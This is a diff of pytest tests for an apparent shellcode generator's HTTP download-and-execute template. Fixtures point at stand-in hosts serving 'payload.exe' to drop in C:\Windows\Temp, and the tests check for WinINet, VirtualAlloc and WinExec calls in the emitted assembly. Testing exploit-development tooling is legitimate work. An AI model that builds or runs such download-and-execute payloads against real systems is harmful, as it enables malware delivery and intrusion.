@@ -270,3 +270,214 @@ class TestMergeTemplateRequirements:
             assemble=False,
         )
         assert "WinExec" in result.asm
+
+
+# ---------------------------------------------------------------------------
+# HTTP download template
+# ---------------------------------------------------------------------------
+
+
+@pytest.fixture
+def http_config():
+    from Tools.emitter.payload_templates.base import TemplateConfig
+    return TemplateConfig(
+        lhost="192.168.1.10",
+        lport=8000,
+        url="http://192.168.1.10:8000/payload.exe",
+        dst_path="C:\\Windows\\Temp\\payload.exe",
+    )
+
+
+def test_http_download_inet_open_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("InternetOpenA").ebp_ref in asm
+
+
+def test_http_download_inet_openurl_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("InternetOpenUrlA").ebp_ref in asm
+
+
+def test_http_download_inet_readfile_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("InternetReadFile").ebp_ref in asm
+
+
+def test_http_download_inet_close_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("InternetCloseHandle").ebp_ref in asm
+
+
+def test_http_download_virtualalloc_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("VirtualAlloc").ebp_ref in asm
+
+
+def test_http_download_createfile_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("CreateFileA").ebp_ref in asm
+
+
+def test_http_download_winexec_slot(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert http_download_layout.slot("WinExec").ebp_ref in asm
+
+
+def test_http_download_variable_slots(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    for var in ("inet_session", "inet_url", "virt_buf", "file_handle",
+                "bytes_read", "bytes_total"):
+        assert http_download_layout.slot(var).ebp_ref in asm, f"{var} not referenced"
+
+
+def test_http_download_string_slots(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    for label in ("user_agent", "url", "dst_path"):
+        assert http_download_layout.slot(label).ebp_ref in asm, f"{label} not referenced"
+
+
+def test_http_download_no_hardcoded_offsets(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    known_refs = {s.ebp_ref for s in http_download_layout.all_slots()}
+    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
+        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"
+
+
+def test_http_download_read_loop_bounds_check(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    assert "buffer full" in asm
+    assert "http_read_loop:" in asm
+    assert "http_read_done:" in asm
+    assert "http_read_sized:" in asm
+
+
+def test_http_download_checks_return_value(http_download_layout, http_config):
+    from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+    t = HttpDownloadTemplate()
+    asm = t.emit(http_download_layout, http_config)
+    lines = asm.splitlines()
+    read_call_idx = None
+    for i, line in enumerate(lines):
+        if "InternetReadFile" in line and "call" not in line:
+            continue
+        if "call" in line and read_call_idx is None:
+            if i > 0 and "InternetReadFile" in lines[i - 1]:
+                continue
+        if "call dword ptr" in line:
+            stripped = line.strip()
+            inet_read_ref = http_download_layout.slot("InternetReadFile").ebp_ref
+            if inet_read_ref in stripped:
+                read_call_idx = i
+                break
+    assert read_call_idx is not None, "InternetReadFile call not found"
+    post_call = "\n".join(lines[read_call_idx + 1 : read_call_idx + 5])
+    assert "test eax, eax" in post_call, "Return value not checked after InternetReadFile"
+
+
+class TestHttpDownloadProbeSlots:
+
+    def test_probe_includes_wininet_apis(self, http_config):
+        from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+        slots = HttpDownloadTemplate().probe_slots(http_config)
+        for api in ("InternetOpenA", "InternetOpenUrlA", "InternetReadFile",
+                     "InternetCloseHandle"):
+            assert api in slots
+
+    def test_probe_includes_kernel32_apis(self, http_config):
+        from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+        slots = HttpDownloadTemplate().probe_slots(http_config)
+        for api in ("VirtualAlloc", "CreateFileA", "WriteFile", "CloseHandle", "WinExec"):
+            assert api in slots
+
+    def test_probe_includes_variables(self, http_config):
+        from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+        slots = HttpDownloadTemplate().probe_slots(http_config)
+        for var in ("inet_session", "inet_url", "virt_buf", "file_handle",
+                     "bytes_read", "bytes_total"):
+            assert var in slots
+
+    def test_probe_includes_strings(self, http_config):
+        from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+        slots = HttpDownloadTemplate().probe_slots(http_config)
+        for label in ("user_agent", "url", "dst_path"):
+            assert label in slots
+
+    def test_probe_returns_unique(self, http_config):
+        from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+        slots = HttpDownloadTemplate().probe_slots(http_config)
+        assert len(slots) == len(set(slots))
+
+
+class TestHttpDownloadAutoDerive:
+
+    def test_auto_adds_loadlibrarya_for_wininet(self):
+        from Tools.emitter.schema import Manifest, StringEntry
+        from Tools.emitter.build import _merge_template_requirements
+        from Tools.emitter.payload_templates.http_download import HttpDownloadTemplate
+        from Tools.emitter.payload_templates.base import TemplateConfig
+        bare = Manifest(badchars={0x00}, functions=[], strings=[
+            StringEntry(label="wininet_dll", value="wininet.dll", method="push"),
+            StringEntry(label="user_agent", value="Mozilla/5.0", method="mov"),
+            StringEntry(label="url", value="http://x/p", method="mov"),
+            StringEntry(label="dst_path", value="C:\\p.exe", method="mov"),
+        ])
+        config = TemplateConfig(url="http://x/p", dst_path="C:\\p.exe")
+        merged = _merge_template_requirements(bare, HttpDownloadTemplate(), config)
+        assert "LoadLibraryA" in merged.functions
+        assert "InternetOpenA" in merged.functions
+
+    def test_full_build_succeeds(self, manifest_dir, tmp_path):
+        from Tools.emitter.build import build
+        from Tools.emitter.payload_templates.base import TemplateConfig
+        config = TemplateConfig(
+            url="http://192.168.1.10:8000/payload.exe",
+            dst_path="C:\\Windows\\Temp\\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "http_download.yaml"),
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert "InternetOpenA" in result.asm
+        assert "InternetReadFile" in result.asm
+        assert "http_read_loop:" in result.asm
+        assert "wininet.dll" in result.asm
+        assert result.layout is not None
+
+    def test_url_cli_override(self, manifest_dir, tmp_path):
+        from Tools.emitter.build import build
+        from Tools.emitter.payload_templates.base import TemplateConfig
+        config = TemplateConfig(
+            url="http://10.0.0.1:9999/custom.bin",
+            dst_path="C:\\Windows\\Temp\\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "http_download.yaml"),
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert "http://10.0.0.1:9999/custom.bin" in result.asm
